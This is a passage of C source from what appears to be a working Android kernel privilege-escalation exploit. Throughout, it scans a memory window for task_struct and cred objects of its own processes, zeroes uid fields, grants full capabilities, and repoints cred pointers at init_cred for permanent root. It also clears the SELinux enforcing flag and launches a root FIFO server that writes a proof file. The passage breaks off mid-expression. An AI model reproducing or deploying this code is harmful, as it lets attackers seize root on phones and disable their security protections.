                        it_pa + (uint64_t)OFF_TASKS + PAGE_OFF - M_known;
                    uint64_t nx = 0;
                    if (sigsetjmp(jmpbuf, 1) == 0) {
                        jmp_armed = 1;
                        nx = *(volatile uint64_t *)
                            (lb + (it_pa - LOW_BASE) + OFF_TASKS + 8);
                        jmp_armed = 0;
                    } else { jmp_armed = 0; nx = 0; }
                    while (nx && whops < 512 && n_wz < MAX_WZ) {
                        if (nx == head_tasks_rt) break;
                        if ((nx >> 48) != 0xffffu) break;
                        /* nx is the neighbouring task's tasks member VA; subtract OFF_TASKS to get
                           back to the task base. */
                        uint64_t cpa = nx - (uint64_t)OFF_TASKS -
                            PAGE_OFF + M_known;
                        if (cpa < LOW_BASE || cpa >= LOW_BASE + LOW_SIZE)
                            break;
                        volatile uint8_t *nd = lb + (cpa - LOW_BASE);
                        uint64_t comm8 = 0, nn = 0;
                        if (sigsetjmp(jmpbuf, 1) == 0) {
                            jmp_armed = 1;
                            comm8 = *(volatile uint64_t *)(nd + OFF_COMM);
                            nn = *(volatile uint64_t *)(nd + OFF_TASKS + 8);
                            jmp_armed = 0;
                        } else { jmp_armed = 0; break; }
                        whops++;
                        if ((comm8 & 0xFFFFFFFFULL) ==
                            (uint64_t)(uint32_t)0x6E727562ULL &&
                            n_wz < MAX_WZ)
                            wz_pa[n_wz++] = cpa;
                        nx = nn;
                    }
                    L("[M-FAST-WALK] walked %d hops, %d burn candidates\n", whops, n_wz);
                    log_fsync();
                    int zroot = 0;
                    for (int zi = 0; zi < n_wz && !zroot; zi++) {
                        volatile uint8_t *nd =
                            lb + (wz_pa[zi] - LOW_BASE);
                        uint64_t cred_va = 0;
                        if (sigsetjmp(jmpbuf, 1) == 0) {
                            jmp_armed = 1;
                            cred_va = *(volatile uint64_t *)(nd + OFF_CRED);
                            jmp_armed = 0;
                        } else { jmp_armed = 0; continue; }
                        if ((cred_va >> 48) != 0xffffu) continue;
                        uint64_t cred_pa = cred_va - PAGE_OFF + M_known;
                        /* Nothing above the top segment is patched, same filter as the sweep. */
                        if (cred_pa < LOW_BASE ||
                            cred_pa >= LOW_BASE + 0xA0000000ULL) continue;
                        volatile uint8_t *cr = lb + (cred_pa - LOW_BASE);
                        uint32_t uidv = 0, sgidv = 0;
                        if (sigsetjmp(jmpbuf, 1) == 0) {
                            jmp_armed = 1;
                            uidv = *(volatile uint32_t *)(cr + 4);
                            sgidv = *(volatile uint32_t *)(cr + 16);
                            jmp_armed = 0;
                        } else { jmp_armed = 0; continue; }
                        L("[M-FAST-WALK] wz#%d cred_pa=%llx uid=%u gate=%d\n",
                          zi, (unsigned long long)cred_pa, uidv,
                          uidv == 2000 && sgidv == 2000);
                        log_fsync();
                        if (!(uidv == 2000 && sgidv == 2000)) continue;
                        if (sigsetjmp(jmpbuf, 1) == 0) {
                            jmp_armed = 1;
                            /* Zero the first six ids and leave fsuid@28 and fsgid@32 alone. A root shell
                               passes DAC on owner bits and there is no CAP_DAC_OVERRIDE to fall back on in
                               the shell domain, so O_CREAT still came back EACCES. getuid() keeps reading
                               uid@4 == 0. */
                            for (int w = 0; w < 6; w++)
                                *(volatile uint32_t *)(cr + 4 + w * 4) = 0;
                            for (int w = 0; w < 5; w++)
                                *(volatile uint64_t *)(cr + 40 + w * 8) =
                                    0x0000003FFFFFFFFFULL;
                            jmp_armed = 0;
                        } else { jmp_armed = 0; continue; }
                        /* Broadcast the wakeup: a patched child answers R. */
                        for (int bi = 0; bi < n_burn && !zroot; bi++) {
                            if (write(burn_cmdw[bi], "W", 1) != 1) continue;
                            struct pollfd p = { .fd = burn_rspr[bi],
                                                .events = POLLIN };
                            if (poll(&p, 1, 80) > 0) {
                                char c;
                                if (read(burn_rspr[bi], &c, 1) == 1 &&
                                    c == 'R') {
                                    L("[+] FAST child#%d ROOTED\n", bi);
                                    log_fsync();
                                    zroot = 1;
                                }
                            }
                        }
                    }
                    if (zroot) {
                        safe_sync();
                        /* The winning child carries the server; the parent must not fork again,
                           or two servers would split the stream. */
                        uaf_pause();
                    }
                }

                /* Zero the identity fields and set caps to FULL; getuid() confirms the hit.
                   Record every patched cred: leaving patched non-shell system creds behind
                   crashes the device. Restoration writes back the uid fields only, since a
                   leftover caps FULL is harmless. */
                static uint64_t cr_patched[MAX_CRED];
                int n_cr_patched = 0;
                /* Creds a child acknowledged keep uid 0, because the child server depends on
                   that cred's contents; the rest are restored to 2000 whether or not the run
                   rooted. Stopping at three winners is ample redundancy and leaves fewer
                   creds patched. */
                static uint64_t win_pas[8];
                int n_win = 0;
                for (int i = 0; i < n_cred && !main_rooted && n_win < 3;
                     i++) {
                    volatile uint8_t *cr = lb + (cred_hits[i] - LOW_BASE);
                    if (sigsetjmp(jmpbuf, 1) == 0) {
                        jmp_armed = 1;
                        for (int w = 0; w < 6; w++)   /* Leave the last two id words at 2000: file ops then match on owner bits and O_CREAT stops failing. */
                            *(volatile uint32_t *)(cr + 4 + w * 4) = 0;
                        for (int w = 0; w < 5; w++)
                            *(volatile uint64_t *)(cr + 40 + w * 8) =
                                0x0000003FFFFFFFFFULL;
                        if (n_cr_patched < MAX_CRED)
                            cr_patched[n_cr_patched++] = cred_hits[i];
                        jmp_armed = 0;
                    } else { jmp_armed = 0; continue; }
                    { struct timespec rzy2; clock_gettime(CLOCK_MONOTONIC, &rzy2); g_wd_round = (long long)rzy2.tv_sec; }   /* Feed the watchdog between candidates. */
                    uid_t gu = getuid();
                    L("[ROOT] cred#%d pa=%llx patched getuid=%d\n",
                      i, (unsigned long long)cred_hits[i], gu);
                    log_fsync();
                    if (gu == 0) { main_rooted = 1; rooted = 1; }   /* Root in the main process is the stable state: while main lives, root lives. */
                    /* Wake every burn child, then one poll() collects all replies; polling the
                       children in turn costs a timeout each. A child that did not win sleeps
                       again without replying, so a poll timeout means the candidate was not the
                       real one. */
                    for (int bi = 0; bi < n_burn; bi++)
                        (void)write(burn_cmdw[bi], "W", 1);
                    {
                        static struct pollfd bp[BURN_MAX];
                        int nb = 0;
                        for (int bi = 0; bi < n_burn; bi++) {
                            bp[nb].fd     = burn_rspr[bi];
                            bp[nb].events = POLLIN;
                            bp[nb].revents = 0;
                            nb++;
                        }
                        int pr = poll(bp, nb, 120);
                        if (pr > 0) {
                            for (int bi = 0; bi < n_burn; bi++) {
                                if (!(bp[bi].revents & POLLIN)) continue;
                                char c;
                                if (read(burn_rspr[bi], &c, 1) == 1 &&
                                    c == 'R') {
                                    L("[+] child#%d ROOTED; proof written\n", bi);
                                    log_fsync();
                                    if (burn_win_child < 0) burn_win_child = bi;
                                    rooted = 1;   /* Record it and keep patching: only the main process's uid 0 is stable. */
                                    if (n_win < 8)
                                        win_pas[n_win++] = cred_hits[i];
                                }
                            }
                        }
                    }
                }
                if (n_cr_patched > 0) {
                    int rv5 = 0;
                    for (int p = 0; p < n_cr_patched; p++) {
                        int iswin = 0;
                        for (int q = 0; q < n_win; q++)
                            if (win_pas[q] == cr_patched[p]) iswin = 1;
                        if (iswin) continue;
                        volatile uint8_t *cr =
                            lb + (cr_patched[p] - LOW_BASE);
                        if (sigsetjmp(jmpbuf, 1) == 0) {
                            jmp_armed = 1;
                            /* Six words only: nine would also write 2000 into securebits. */
                            for (int w = 0; w < 6; w++)
                                *(volatile uint32_t *)(cr + 4 + w * 4) =
                                    2000;
                            jmp_armed = 0;
                            rv5++;
                        } else { jmp_armed = 0; }
                    }
                    L("[ROOT] restored %d/%d patched creds (%d winners kept uid 0)\n",
                      rv5, n_cr_patched, n_win);
                    log_fsync();
                }
                /* Permanent root: point task->cred and task->real_cred at init_cred, which
                   lives in .data and is never recycled, so root does not expire when the
                   original cred falls out of the window. A main-task swap is confirmed by
                   getuid(); a child swap needs a broadcast ack, at most 8 tries. */
                if (image_pa_found) {   /* M_known == 0 is legal. */
                    const uint64_t init_cred_va =
                        image_pa_found + D_INIT_CRED + PAGE_OFF - M_known;
                    int perm_main = 0;
                    for (int ti = 0; ti < n_tsk && !perm_main; ti++) {
                        uint64_t tb = tsk_hits[ti] - (uint64_t)OFF_COMM;
                        if (tb < LOW_BASE || tb >= LOW_BASE + LOW_SIZE)
                            continue;
                        volatile uint64_t *pc =
                            (volatile uint64_t *)(lb + (tb - LOW_BASE) +
                                                  OFF_CRED);
                        uint64_t sv = 0;
                        if (sigsetjmp(jmpbuf, 1) == 0) {
                            jmp_armed = 1;
                            sv = pc[0];
                            if ((sv >> 48) != 0xffffu || (sv & 7)) {
                                jmp_armed = 0;
                                continue;
                            }
                            pc[0] = init_cred_va;
                            pc[-1] = init_cred_va;
                            jmp_armed = 0;
                        } else { jmp_armed = 0; continue; }
                        if (getuid() == 0) {
                            perm_main = 1; main_rooted = 1; rooted = 1;
                            L("[PERM-ROOT] main task@%llx cred->init_cred = permanent root\n",
                              (unsigned long long)tb);
                            log_fsync();
                        } else {
                            if (sigsetjmp(jmpbuf, 1) == 0) {
                                jmp_armed = 1;
                                pc[0] = sv;
                                pc[-1] = sv;
                                jmp_armed = 0;
                            } else jmp_armed = 0;
                        }
                        { struct timespec rzp;
                          clock_gettime(CLOCK_MONOTONIC, &rzp);
                          g_wd_round = (long long)rzp.tv_sec; }
                    }
                    int burn_perm_root = 0;
                    for (int zi = 0; zi < n_burn_hit && zi < 8 && !burn_perm_root;
                         zi++) {
                        uint64_t tb = burn_hit_pa[zi];
                        if (tb < LOW_BASE || tb >= LOW_BASE + LOW_SIZE)
                            continue;
                        volatile uint64_t *pc =
                            (volatile uint64_t *)(lb + (tb - LOW_BASE) +
                                                  OFF_CRED);
                        uint64_t sv = 0;
                        if (sigsetjmp(jmpbuf, 1) == 0) {
                            jmp_armed = 1;
                            sv = pc[0];
                            if ((sv >> 48) != 0xffffu || (sv & 7)) {
                                jmp_armed = 0;
                                continue;
                            }
                            pc[0] = init_cred_va;
                            pc[-1] = init_cred_va;
                            jmp_armed = 0;
                        } else { jmp_armed = 0; continue; }
                        L("[PERM-ROOT] burn%02d task@%llx cred->init_cred (trial patch)\n",
                          burn_hit_suffix[zi], (unsigned long long)tb);
                        log_fsync();
                        for (int bi = 0; bi < n_burn; bi++)
                            (void)write(burn_cmdw[bi], "W", 1);
                        {
                            static struct pollfd ppb[BURN_MAX];
                            int nb = 0;
                            for (int bi = 0; bi < n_burn; bi++) {
                                ppb[nb].fd = burn_rspr[bi];
                                ppb[nb].events = POLLIN;
                                ppb[nb].revents = 0;
                                nb++;
                            }
                            if (poll(ppb, nb, 400) > 0) {
                                for (int bi = 0; bi < n_burn; bi++) {
                                    if (!(ppb[bi].revents & POLLIN))
                                        continue;
                                    char c;
                                    if (read(burn_rspr[bi], &c, 1) == 1 &&
                                        c == 'R') {
                                        burn_perm_root = 1;
                                        perm_win = 1;
                                        rooted = 1;
                                        L("[+] PERM child#%d ROOTED (cred <- init_cred)\n",
                                          bi);
                                        log_fsync();
                                    }
                                }
                            }
                        }
                        if (!burn_perm_root) {
                            if (sigsetjmp(jmpbuf, 1) == 0) {
                                jmp_armed = 1;
                                pc[0] = sv;
                                pc[-1] = sv;
                                jmp_armed = 0;
                            } else jmp_armed = 0;
                        }
                        { struct timespec rzq;
                          clock_gettime(CLOCK_MONOTONIC, &rzq);
                          g_wd_round = (long long)rzq.tv_sec; }
                    }
                }
                if (rooted) {
                    /* A content-patched root still gets EACCES creating files: the exec chain
                       resets fsuid and the refusal is plain DAC, with no AVC. Clearing enforcing
                       makes CAP_DAC_OVERRIDE effective again, giving the root shell unrestricted
                       file access. */
                    uint64_t sel_pa = image_pa_found +
                        (ST_SELINUX_LINK - ST_TEXT_LINK);
                    if (sel_pa >= LOW_BASE &&
                        sel_pa < LOW_BASE + LOW_SIZE &&
                        sigsetjmp(jmpbuf, 1) == 0) {
                        jmp_armed = 1;
                        /* struct selinux_state: bool disabled at 0, bool enforcing at 1. Reading
                           offset 0 returns 0x1000000, not the enforcing flag. */
                        volatile uint8_t *se =
                            (volatile uint8_t *)(lb + (sel_pa - LOW_BASE) + 1);
                        uint8_t old_se = *se;
                        if (old_se == 1) {
                            *se = 0;
                            uint8_t rb_se = *se;
                            L("[SEL] enforcing byte %u->0 read-back=%u (permissive)\n",
                              old_se, rb_se);
                        } else {
                            L("[SEL] enforcing byte reads %u (not 1; left untouched)\n",
                              old_se);
                        }
                        jmp_armed = 0;
                        log_fsync();
                    } else { jmp_armed = 0; }
                }
                if (rooted && (main_rooted || perm_win)) {
                    L("[ROOT-CONFIRMED getuid()==0]\n");
                    log_fsync();
                    safe_sync();
                    /* The child inherits the patched cred, writes the proof file and enters
                       root_fifo_server(); the parent stays paused to hold the device. */
                    if (main_rooted) {
                        pid_t spid = fork();
                        if (spid == 0) {
                            signal(SIGSEGV, SIG_DFL);
                            signal(SIGBUS,  SIG_DFL);
                            signal(SIGALRM, SIG_DFL); alarm(0);
                            signal(SIGTERM, SIG_IGN);
                            signal(SIGINT,  SIG_IGN);
                            signal(SIGHUP,  SIG_IGN);
                            int pf = syscall(SYS_openat, AT_FDCWD,
                                "/data/local/tmp/root_proof.txt",
                                O_WRONLY | O_CREAT | O_TRUNC, 0644);
                            if (pf >= 0) {
                                syscall(SYS_write, pf, "ROOTED_MAIN_FORKSRV\n", 20UL);
                                syscall(SYS_close, pf);
                            }
                            root_fifo_server();   /* noreturn */
                        }
                        L("[SRV] main-path fork server child pid=%d\n", (int)spid);
                          /* Publish g_srv_pid so uaf_pause() can observe this server dying, as the
                             other fork path does. */
                          g_srv_pid = spid;
                        log_fsync();
                    }
                    uaf_pause();
                }
                else if (rooted) {
                    /* A child root obtained by patching cred contents dies once the window's
                       pages are recycled, so do not pause here: keep scanning for a permanent
                       root. */
                    L("[TRANSIENT-ROOT] transient child root; not pausing, continuing the scan for a permanent root\n");
                    log_fsync();
                    /* The acknowledged child's task_struct sits in the same window cluster as the
                       hit cred, within tens of MB. Scan the 64MB either side at 4-byte steps
                       for its comm: an 8-byte phase scan finds nothing. Swap cred and real_cred
                       to init_cred, then confirm with a broadcast ack. */
                    if (image_pa_found && n_cred > 0) {
                        const uint64_t init_cred_va = image_pa_found +
                            D_INIT_CRED + PAGE_OFF - M_known;
                        uint64_t lo6 = cred_hits[0] > (64ULL << 20)
                            ? cred_hits[0] - (64ULL << 20) : LOW_BASE;
                        uint64_t hi6 = cred_hits[0] + (64ULL << 20);
                        if (hi6 > LOW_BASE + LOW_SIZE)
                            hi6 = LOW_BASE + LOW_SIZE;
                        L("[CRED-PTR-SWAP-CLUSTER] cluster fine scan [%llx,%llx] init_cred_va=%llx\n",
                          (unsigned long long)lo6,
                          (unsigned long long)hi6,
                          (unsigned long long)init_cred_va);
                        log_fsync();
                        int cwin = 0;
                        for (int zi = 0; zi < MAX_BURN_HIT && !cwin; zi++) {
                            (void)zi;
                            static uint64_t cs_hits[16];
                            int n_cs = 0;
                            for (uint64_t pa = lo6; pa + 16 <= hi6 &&
                                 n_cs < 16; pa += 4) {
                                if (sigsetjmp(jmpbuf, 1) != 0) {
                                    jmp_armed = 0;
                                    pa = ((pa | 0x1FFFFFULL) + 1) - 4;
                                    continue;
                                }
                                jmp_armed = 1;
                                uint32_t z4 = *(volatile uint32_t *)
                                    (lb + (pa - LOW_BASE));
                                if (z4 == 0x6E727562u) {
                                    uint32_t n4 = *(volatile uint32_t *)
                                        (lb + (pa - LOW_BASE) + 4);
                                    uint8_t d1 = (uint8_t)n4,
                                            d2 = (uint8_t)(n4 >> 8);
                                    uint16_t z9 = (uint16_t)(n4 >> 16);
                                    if (d1 >= '0' && d1 <= '9' &&
                                        d2 >= '0' && d2 <= '9' && z9 == 0 &&
                                        pa >= LOW_BASE + OFF_COMM)
                                        cs_hits[n_cs++] = pa;
                                }
                                jmp_armed = 0;
                            }
                            L("[CRED-PTR-SWAP-CLUSTER] hit %d burn task comms\n", n_cs);
                            log_fsync();
                            for (int ci = 0; ci < n_cs && !cwin; ci++) {
                                uint64_t tb = cs_hits[ci] - OFF_COMM;
                                if (tb < LOW_BASE || tb >= LOW_BASE + LOW_SIZE)
                                    continue;
                                volatile uint64_t *pc =
                                    (volatile uint64_t *)
                                        (lb + (tb - LOW_BASE) + OFF_CRED);
                                uint64_t sv = 0;
                                if (sigsetjmp(jmpbuf, 1) == 0) {
                                    jmp_armed = 1;
                                    sv = pc[0];
                                    if ((sv >> 48) != 0xffffu || (sv & 7)) {
                                        jmp_armed = 0;
                                        continue;
                                    }
                                    pc[0] = init_cred_va;
                                    pc[-1] = init_cred_va;
                                    jmp_armed = 0;
                                } else { jmp_armed = 0; continue; }
                                L("[CRED-PTR-SWAP-CLUSTER] burn task@%llx cred->init (trial patch)\n",
                                  (unsigned long long)tb);
                                log_fsync();
                                for (int bi = 0; bi < n_burn; bi++)
                                    (void)write(burn_cmdw[bi], "W", 1);
                                {
                                    static struct pollfd cqb[BURN_MAX];
                                    int nb = 0;
                                    for (int bi = 0; bi < n_burn; bi++) {
                                        cqb[nb].fd = burn_rspr[bi];
                                        cqb[nb].events = POLLIN;
                                        cqb[nb].revents = 0;
                                        nb++;
                                    }
                                    if (poll(cqb, nb, 400) > 0) {
                                        for (int bi = 0; bi < n_burn && !cwin;
                                             bi++) {
                                            if (!(cqb[bi].revents & POLLIN))
                                                continue;
                                            char c;
                                            if (read(burn_rspr[bi], &c, 1) ==
                                                    1 && c == 'R') {
                                                cwin = 1; perm_win = 1;
                                                rooted = 1;
                                                L("[CRED-PTR-SWAP-CLUSTER] child#%d permanent root (cred <- init_cred)\n",
                                                  bi);
                                                log_fsync();
                                            }
                                        }
                                    }
                                }
                                if (!cwin) {
                                    if (sigsetjmp(jmpbuf, 1) == 0) {
                                        jmp_armed = 1;
                                        pc[0] = sv;
                                        pc[-1] = sv;
                                        jmp_armed = 0;
                                    } else jmp_armed = 0;
                                }
                                { struct timespec cz1;
                                  clock_gettime(CLOCK_MONOTONIC, &cz1);
                                  g_wd_round = (long long)cz1.tv_sec; }
                            }
                            break;
                        }
                        if (cwin) {
                            safe_sync();
                            /* The winning child is permanently rooted, so its server no longer depends on
                               the window; fork a backup server in case the winner's server dies. */
                            pid_t spid = fork();
                            if (spid == 0) {
                                signal(SIGSEGV, SIG_DFL);
                                signal(SIGBUS,  SIG_DFL);
                                signal(SIGALRM, SIG_DFL); alarm(0);
                                signal(SIGTERM, SIG_IGN);
                                signal(SIGINT,  SIG_IGN);
                                signal(SIGHUP,  SIG_IGN);
                                int pf = syscall(SYS_openat, AT_FDCWD,
                                    "/data/local/tmp/root_proof.txt",
                                    O_WRONLY | O_CREAT | O_TRUNC, 0644);
                                if (pf >= 0) {
                                    syscall(SYS_write, pf,
                                            "ROOTED_PERM_FORKSRV\n", 21UL);
                                    syscall(SYS_close, pf);
                                }
                                root_fifo_server();   /* noreturn */
                            }
                            L("[SRV] PSWAP-C fork server child pid=%d\n",
                              (int)spid);
                          /* Publish g_srv_pid so uaf_pause() can observe this server dying, as the
                             other fork path does. */
                          g_srv_pid = spid;
                            log_fsync();
                            uaf_pause();
                        }
                    }
                }
            }

            /* Collect every burn child's task_struct in one sweep before patching any:
               verifying a single candidate (wake plus broadcast poll) costs far more than
               the scan that found it. The sweep stops at MAX_CAND, so the rest of the
               window is never examined. */
            #define MAX_CAND 256   /* A smaller cap truncates the comm scan under high
                                   coverage and silently drops candidates. */
            static uint64_t cand_pa[MAX_CAND];
            static int cand_idx[MAX_CAND];   /* burn child index for a "burn" comm hit, -1 for a COMM_TAG_MAIN hit */
            int n_cand = 0, n_sea = 0, n_pg = 0;
            for (uint64_t off = 0; off < LOW_SIZE && n_cand < MAX_CAND &&
                 !rooted; off += 4096) {   /* Rooted ends the sweep: the winning child or the forked
                                            server already carries root, and continuing costs a
                                            watchdog period. */
                volatile uint8_t *pg = lb + off;
                if (sigsetjmp(jmpbuf, 1) == 0) {
                    jmp_armed = 1;
                    /* The comm constant's byte 4 is '_'; transcribed as 0x33 it matches
                       nothing and the scan yields no candidates. */
                    const uint64_t COMM_TAG_MAIN = 0x3333325F6C73676BULL;
                    /* The tag is defined once at file scope: BURN_COMM_TAG. */
                    for (int o = 0; o <= 4096 - 16; o += 8) {
                        uint32_t z32 = *(volatile uint32_t *)(pg + o);
                        if (z32 == (uint32_t)BURN_COMM_TAG) {
                            uint8_t d1 = pg[o + 4], d2 = pg[o + 5];
                            if (d1 >= '0' && d1 <= '9' &&
                                d2 >= '0' && d2 <= '9' &&
                                pg[o + 6] == 0 &&
                                off + (uint64_t)o >= (uint64_t)OFF_COMM) {
                                int bi = (d1 - '0') * 10 + (d2 - '0');
                                if (bi < n_burn && n_cand < MAX_CAND) {
                                    cand_pa[n_cand] =
                                        LOW_BASE + off + (uint64_t)o -
                                        OFF_COMM;
                                    cand_idx[n_cand] = bi;
                                    n_cand++;
                                    L("[+] BURN candidate burn%02d PA=0x%llx\n",
                                      bi,
                                      (unsigned long long)cand_pa[n_cand-1]);
                                }
                                continue;
                            }
                        }
                        uint64_t v = *(volatile uint64_t *)(pg + o);
                        if (v != COMM_TAG_MAIN) continue;
                        if (pg[o + 8] != '7' || pg[o + 9] != '3' ||
                            pg[o + 10] != '_' || pg[o + 11] != 'p') continue;
                        if (off + (uint64_t)o < OFF_COMM) continue;
                        uint64_t cand =
                            LOW_BASE + off + (uint64_t)o - OFF_COMM;
                        volatile uint8_t *tp0 =
                            lb + (cand - LOW_BASE) + OFF_TASKS;
                        uint64_t nxp = *(volatile uint64_t *)tp0;
                        /* Both links must land in the linear map,
                           [0xffffff8000000000, 0xffffffc000000000). */
                        if (nxp < 0xffffff8000000000ULL ||
                            nxp >= 0xffffffc000000000ULL) continue;
                        uint64_t pvp = *(volatile uint64_t *)(tp0 + 8);
                        if (pvp < 0xffffff8000000000ULL ||
                            pvp >= 0xffffffc000000000ULL) continue;
                        if (n_cand < MAX_CAND) {
                            cand_idx[n_cand] = -1; cand_pa[n_cand++] = cand;
                            L("[+] task_struct candidate#%d PA=0x%llx\n",
                              n_cand, (unsigned long long)cand);
                        }
                    }
                    jmp_armed = 0;
                    n_pg++;
                } else {
                    jmp_armed = 0;
                    n_sea++;
                    off = ((off | 0x1FFFFFULL) + 1) - 4096;
                    /* Circuit breaker: once the window is torn every candidate is garbage
                       (nx == 0x8c), so after 64 faults abandon the scan and fall through
                       to the pause path. */
                    if (n_sea >= 64) {
                        L("[D] scan SEGV x%d circuit break; window torn, abandoning scan\n",
                          n_sea);
                        log_fsync();
                        break;
                    }
                }
                if ((n_pg & 0x3FFF) == 0) {
                    struct timespec rs3;
                    clock_gettime(CLOCK_MONOTONIC, &rs3);
                    g_wd_round = (long long)rs3.tv_sec;
                    L("[D] comm scan %llxMB/%llx SEA=%d cand=%d\n",
                      (unsigned long long)(off >> 20),
                      (unsigned long long)(LOW_SIZE >> 20), n_sea, n_cand);
                    log_fsync();
                }
            }
            L("[D] comm scan done: pages=%d SEA=%d cand=%d %s\n",
              n_pg, n_sea, n_cand,
              n_cand ? "; entering per-candidate patching" : "; none found");
            log_fsync();
            if (!n_cand) uaf_pause();

            /* Point task->cred at init_cred rather than patching cred contents: the
               cred objects sit 5-7GB outside the window and read back as garbage. */
            if (mode_root && image_pa_found && n_cand > 0) {   /* M_known == 0 is legal. */
                uint64_t init_cred_va = image_pa_found + D_INIT_CRED +
                                        PAGE_OFF - M_known;
                L("[COMMSCAN] %d comm-scan candidates; init_cred_va=0x%llx\n",
                  n_cand, (unsigned long long)init_cred_va);
                log_fsync();
                int zr2 = 0;
                for (int zi = 0; zi < n_cand && !zr2 && !main_rooted; zi++) {
                    uint64_t tb = cand_pa[zi];
                    volatile uint64_t *pct =
                        (volatile uint64_t *)(lb + (tb - LOW_BASE));
                    volatile uint64_t *pc = pct + (OFF_CRED / 8);
                    volatile uint64_t *pt = pct + (OFF_TASKS / 8);
                    uint64_t cred_va = 0, nx = 0;
                    uint32_t comm0 = 0;
                    int is_main = 0;
                    if (sigsetjmp(jmpbuf, 1) == 0) {
                        jmp_armed = 1;
                        /* Route by comm: "burn" is a child, confirmed by a broadcast ack;
                           "kgsl" is the main process, confirmed by getuid(). Any other comm
                           is left alone. */
                        comm0 = *(volatile uint32_t *)
                            ((volatile uint8_t *)pct + OFF_COMM);
                        if (comm0 == 0x6E727562u) {
                            is_main = 0;
                        } else if (comm0 == 0x6C73676Bu) {
                            is_main = 1;
                        } else {
                            jmp_armed = 0;
                            L("[COMMSCAN] cand%02d rej=comm comm0=%08x\n",
                              zi, comm0);
                            continue;
                        }
                        nx = pt[0];
                        if (nx < 0xffffff8000000000ULL ||
                            nx >= 0xffffffc000000000ULL || (nx & 7)) {
                            jmp_armed = 0;
                            L("[COMMSCAN] cand%02d rej=nx nx=%llx\n",
                              zi, (unsigned long long)nx);
                            continue;
                        }
                        cred_va = *pc;
                        if (cred_va < 0xffffff8000000000ULL ||
                            cred_va >= 0xffffffc000000000ULL ||
                            (cred_va & 7)) {
                            jmp_armed = 0;
                            L("[COMMSCAN] cand%02d rej=cred cred=%llx\n",
                              zi, (unsigned long long)cred_va);
                            continue;
                        }
                        /* getuid() reads real_cred (current_cred() is current->real_cred),
                           so writing cred alone never takes effect. Both pointers go to
                           init_cred. */
                        pc[-1] = init_cred_va;
                        pc[0] = init_cred_va;
                        jmp_armed = 0;
                    } else { jmp_armed = 0; continue; }
                    L("[COMMSCAN] cand%02d %s task@0x%llx cred %llx->init (trial patch)\n",
                      zi, "burn",
                      (unsigned long long)tb,
                      (unsigned long long)cred_va);
                    log_fsync();
                    if (is_main) {
                        if (getuid() == 0) {
                            main_rooted = 1; rooted = 1; zr2 = 1;
                            L("[+] COMMSCAN MAIN task@0x%llx cred->init_cred = main-process permanent root\n",
                              (unsigned long long)tb);
                            log_fsync();
                            continue;
                        }
                        if (sigsetjmp(jmpbuf, 1) == 0) {
                            jmp_armed = 1;
                            pc[-1] = cred_va;
                            pc[0] = cred_va;
                            jmp_armed = 0;
                        } else jmp_armed = 0;
                        { struct timespec rzm;
                          clock_gettime(CLOCK_MONOTONIC, &rzm);
                          g_wd_round = (long long)rzm.tv_sec; }
                        continue;
                    }
                    L("[COMMSCAN] burn%02d task@0x%llx cred %llx->init (trial patch)\n",
                      cand_idx[zi], (unsigned long long)tb,
                      (unsigned long long)cred_va);
                    log_fsync();
                    /* Confirm by broadcast: the comm encodes idx%100, so an index above
                       100 collides and a targeted wake-up reaches the wrong child. Wake
                       all of them; only the patched one answers 'R'. */
                    for (int bi = 0; bi < n_burn; bi++)
                        (void)write(burn_cmdw[bi], "W", 1);
                    int r = 0;
                    {
                        static struct pollfd zbp[BURN_MAX];
                        int nb = 0;
                        for (int bi = 0; bi < n_burn; bi++) {
                            zbp[nb].fd     = burn_rspr[bi];
                            zbp[nb].events = POLLIN;
                            zbp[nb].revents = 0;
                            nb++;
                        }
                        int pr = poll(zbp, nb, 400);
                        if (pr > 0) {
                            for (int bi = 0; bi < n_burn && !r; bi++) {
                                if (!(zbp[bi].revents & POLLIN)) continue;
                                char c;
                                if (read(burn_rspr[bi], &c, 1) == 1 &&
                                    c == 'R')
                                    r = 1;
                            }
                        }
                    }
                    if (r == 1) {
                        L("[+] COMMSCAN burn%02d ROOTED (cred <- init_cred)\n",
                          cand_idx[zi]);
                        log_fsync();
                        zr2 = 1;
                    } else {
                        if (sigsetjmp(jmpbuf, 1) == 0) {
                            jmp_armed = 1;
                            pc[-1] = cred_va;
                            pc[0] = cred_va;
                            jmp_armed = 0;
                        } else jmp_armed = 0;
                    }
                if (zr2) {
                    safe_sync();
                    if (main_rooted) {
                        pid_t spid = fork();
                        if (spid == 0) {
                            signal(SIGSEGV, SIG_DFL);
                            signal(SIGBUS,  SIG_DFL);
                            signal(SIGALRM, SIG_DFL); alarm(0);
                            signal(SIGTERM, SIG_IGN);
                            signal(SIGINT,  SIG_IGN);
                            signal(SIGHUP,  SIG_IGN);
                            int pf = syscall(SYS_openat, AT_FDCWD,
                                "/data/local/tmp/root_proof.txt",
                                O_WRONLY | O_CREAT | O_TRUNC, 0644);
                            if (pf >= 0) {
                                syscall(SYS_write, pf,
                                        "ROOTED_MAIN_FORKSRV\n", 20UL);
                                syscall(SYS_close, pf);
                            }
                            root_fifo_server();   /* noreturn */
                        }
                        L("[SRV] COMMSCAN main-path fork server child pid=%d\n",
                          (int)spid);
                          /* Publish g_srv_pid so uaf_pause() can observe this server dying, as the
                             other fork path does. */
                          g_srv_pid = spid;
                        log_fsync();
                    }
                    uaf_pause();
                } else {
                    L("[COMMSCAN] direct-write route missed; falling back to the cred signature patch\n");
                    log_fsync();
                }
            }

            /* Recover M from adjacency, with no chain walk: for neighbours i and j,
               nx_i = (PA_j + OFF_TASKS) - M + PAGE_OFF, so
               M_ij = PA_j + OFF_TASKS + PAGE_OFF - nx_i.
               The true memstart_addr is 1GB-aligned and collects one vote per member
               of its cluster, while a noise pairing shows no such alignment, so the
               mode is a unique answer. */
            uint64_t M_adj_vote = 0; int adj_vote_best_count = 0;
            {
                #define ADJ_VOTE_MAX_VALUES 64
                static uint64_t adj_vote_val[ADJ_VOTE_MAX_VALUES];
                static int adj_vote_cnt[ADJ_VOTE_MAX_VALUES];
                int adj_vote_kinds = 0;
                for (int i = 0; i < n_cand; i++) {
                    uint64_t nxi = 0;
                    if (sigsetjmp(jmpbuf, 1) == 0) {
                        jmp_armed = 1;
                        nxi = *(volatile uint64_t *)
                            (lb + (cand_pa[i] - LOW_BASE) + OFF_TASKS);
                        jmp_armed = 0;
                    } else { jmp_armed = 0; continue; }
                    if ((nxi >> 48) != 0xffffu ||
                        nxi < PAGE_OFF ||
                        nxi >= PAGE_OFF + 0x100000000ULL) continue;
                    for (int j = 0; j < n_cand; j++) {
                        if (j == i) continue;
                        uint64_t M_pair_candidate = cand_pa[j] + (uint64_t)OFF_TASKS +
